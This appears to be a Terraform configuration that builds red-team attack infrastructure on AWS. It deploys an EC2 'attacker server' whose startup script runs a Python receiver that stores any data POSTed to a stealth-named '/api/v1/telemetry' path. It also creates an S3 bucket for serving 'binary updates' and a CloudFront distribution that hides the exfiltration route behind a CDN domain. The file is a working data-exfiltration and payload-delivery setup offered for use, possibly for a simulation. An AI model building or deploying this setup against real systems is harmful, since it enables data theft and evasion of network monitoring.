terraform {
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 5.0" }
  }
}

provider "aws" { region = "us-east-1" }

# --- 1. STORAGE & IDENTIFIERS ---
resource "random_id" "bucket_suffix" { byte_length = 4 }

resource "aws_s3_bucket" "bin_bucket" {
  bucket = "sim-binary-repo-${random_id.bucket_suffix.hex}"
}

resource "aws_cloudfront_origin_access_control" "s3_oac" {
  name                              = "s3-oac"
  origin_access_control_origin_type = "s3"
  signing_behavior                  = "always"
  signing_protocol                  = "sigv4"
}

# --- 2. ATTACKER EC2 (RECEIVER) ---
resource "aws_security_group" "attacker_sg" {
  name = "attacker-server-sg"

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] 
  }

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] 
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_instance" "attacker_server" {
  ami           = "ami-0c7217cdde317cfec" # Ubuntu 24.04 LTS
  instance_type = "t2.micro"
  vpc_security_group_ids = [aws_security_group.attacker_sg.id]
  
  user_data = <<-EOF
              #!/bin/bash
              apt update -y
              apt install python3 -y

              cat << 'PYTHON_SCRIPT' > /home/ubuntu/server.py
              #!/usr/bin/env python3
              import http.server
              import socketserver
              import os
              from datetime import datetime

              # Create storage directory
              os.makedirs('/home/ubuntu/received_files', exist_ok=True)

              class POSTHandler(http.server.BaseHTTPRequestHandler):
                  def do_POST(self):
                      # Routing check for stealth
                      if self.path.startswith('/api/v1/telemetry'):
                          content_length = int(self.headers.get('Content-Length', 0))
                          post_data = self.rfile.read(content_length)
                          
                          # Dual save logic from your original script
                          timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
                          bin_file = f'/home/ubuntu/received_files/recv_{timestamp}_{content_length}b.bin'
                          txt_file = f'/home/ubuntu/received_files/recv_{timestamp}_{content_length}b.txt'
                          
                          # 1. Save Binary
                          with open(bin_file, 'wb') as f:
                              f.write(post_data)
                          
                          # 2. Save as UTF-8 text (if possible)
                          try:
                              text_data = post_data.decode('utf-8')
                              with open(txt_file, 'w', encoding='utf-8') as f:
                                  f.write(text_data)
                          except UnicodeDecodeError:
                              with open(txt_file, 'w', encoding='utf-8') as f:
                                  f.write(f"BINARY DATA ({content_length} bytes)\n")
                                  f.write(f"Hex preview: {post_data[:64].hex()}\n")
                          
                          # Log to console (visible in server.log)
                          print(f"\n[OK] [{timestamp}] {content_length} bytes -> {bin_file}")
                          print(f"Preview: {repr(post_data[:80])}")
                          print("-" * 60)

                          # Respond to CloudFront
                          self.send_response(200)
                          self.send_header('Content-Type', 'text/plain')
                          self.end_headers()
                          self.wfile.write(b"Telemetry Received\n")
                      else:
                          self.send_response(404)
                          self.end_headers()

              if __name__ == "__main__":
                  # Port 80 for CloudFront compatibility
                  with socketserver.TCPServer(("0.0.0.0", 80), POSTHandler) as httpd:
                      print("Receiver active on port 80...")
                      httpd.serve_forever()
              PYTHON_SCRIPT

              # Run the server as root (needed for Port 80)
              nohup python3 /home/ubuntu/server.py > /home/ubuntu/server.log 2>&1 &
              EOF
}

# --- 3. UNIFIED CLOUDFRONT DISTRIBUTION ---
resource "aws_cloudfront_distribution" "unified_cdn" {
  enabled             = true
  default_root_object = "index.html"

  origin {
    domain_name              = aws_s3_bucket.bin_bucket.bucket_regional_domain_name
    origin_id                = "S3Origin"
    origin_access_control_id = aws_cloudfront_origin_access_control.s3_oac.id
  }

  origin {
    domain_name = aws_instance.attacker_server.public_dns
    origin_id   = "EC2Origin"
    custom_origin_config {
      http_port              = 80
      https_port             = 443
      origin_protocol_policy = "http-only"
      origin_ssl_protocols   = ["TLSv1.2"]
    }
  }

  # DEFAULT BEHAVIOR (/*)
  default_cache_behavior {
    allowed_methods  = ["GET", "HEAD"]
    cached_methods   = ["GET", "HEAD"]
    target_origin_id = "S3Origin"
    
    forwarded_values {
      query_string = false
      cookies {
        forward = "none"
      }
    } # <--- FIXED: Added missing closing brace here

    viewer_protocol_policy = "redirect-to-https"
    min_ttl                = 0
    default_ttl            = 3600
    max_ttl                = 86400
  }

  # ORDERED BEHAVIOR 1: Binary Updates Path (/updates/*)
  ordered_cache_behavior {
    path_pattern     = "/updates/*"
    allowed_methods  = ["GET", "HEAD"]
    cached_methods   = ["GET", "HEAD"]
    target_origin_id = "S3Origin"

    forwarded_values {
      query_string = false
      cookies {
        forward = "none"
      }
    }

    viewer_protocol_policy = "redirect-to-https"
    min_ttl                = 0
    default_ttl            = 3600
    max_ttl                = 86400
  }

  # ORDERED BEHAVIOR 2: Exfiltration Path (/api/v1/telemetry/*)
  ordered_cache_behavior {
    path_pattern     = "/api/v1/telemetry/*"
    allowed_methods  = ["DELETE", "GET", "HEAD", "OPTIONS", "PATCH", "POST", "PUT"]
    cached_methods   = ["GET", "HEAD"]
    target_origin_id = "EC2Origin"

    forwarded_values {
      query_string = true
      headers      = ["*"]
      cookies {
        forward = "all" # Changed to 'all' for better telemetry passing
      }
    }

    viewer_protocol_policy = "https-only"
    min_ttl                = 0
    default_ttl            = 0
    max_ttl                = 0
  }

  viewer_certificate {
    cloudfront_default_certificate = true
  }

  restrictions {
    geo_restriction {
      restriction_type = "none"
    }
  }
}

# --- 4. BUCKET POLICY ---
resource "aws_s3_bucket_policy" "oac_policy" {
  bucket = aws_s3_bucket.bin_bucket.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action   = "s3:GetObject"
      Effect   = "Allow"
      Resource = "${aws_s3_bucket.bin_bucket.arn}/*"
      Principal = { Service = "cloudfront.amazonaws.com" }
      Condition = {
        StringEquals = {
          "AWS:SourceArn" = aws_cloudfront_distribution.unified_cdn.arn
        }
      }
    }]
  })
}